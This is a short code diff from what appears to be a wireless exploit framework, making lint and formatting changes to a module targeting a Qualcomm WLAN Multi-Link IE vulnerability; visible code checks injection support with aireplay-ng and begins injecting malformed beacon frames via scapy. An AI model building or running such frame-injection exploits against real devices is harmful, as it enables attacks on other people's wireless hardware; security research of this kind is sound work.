@@ -16,7 +16,7 @@ import struct
 from pathlib import Path
 
 from wirelessxpl.core.exploit.exploit import Exploit, Protocol
-from wirelessxpl.core.exploit.option import OptBool, OptInteger, OptMAC, OptString
+from wirelessxpl.core.exploit.option import OptBool, OptInteger, OptString
 from wirelessxpl.core.hw_validator import HWValidator, Requirement
 from wirelessxpl.core.phase_gateway import PhaseGateway
 from wirelessxpl.core.polyglot_orchestrator import Lang, PolyglotOrchestrator
@@ -192,11 +192,11 @@ class QualcommWlanMlIeCve202445569(Exploit):
 
     def _mode_check(self) -> None:
         """Verifica se a interface suporta beacon injection."""
-        import shutil  # noqa: PLC0415
+        import shutil
         iface = str(self.INTERFACE.value)
         print(f"[*] Verificando suporte a injection em {iface} ...")
         if shutil.which("aireplay-ng"):
-            import subprocess  # noqa: PLC0415
+            import subprocess
             subprocess.run(["aireplay-ng", "--test", iface], timeout=15)
         else:
             print("[!] aireplay-ng não encontrado: apt install aircrack-ng")
@@ -232,10 +232,15 @@ class QualcommWlanMlIeCve202445569(Exploit):
     ) -> None:
         """Injeta frames com ML IE via scapy (fallback Python)."""
         try:
-            import time  # noqa: PLC0415
-            from scapy.all import (  # noqa: PLC0415
-                Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp,
-                RadioTap, sendp,
+            import time
+
+            from scapy.all import (
+                Dot11,
+                Dot11Beacon,
+                Dot11Elt,
+                Dot11ProbeResp,
+                RadioTap,
+                sendp,
             )
 
             ml_ie_raw = self._build_ml_ie_malformed()
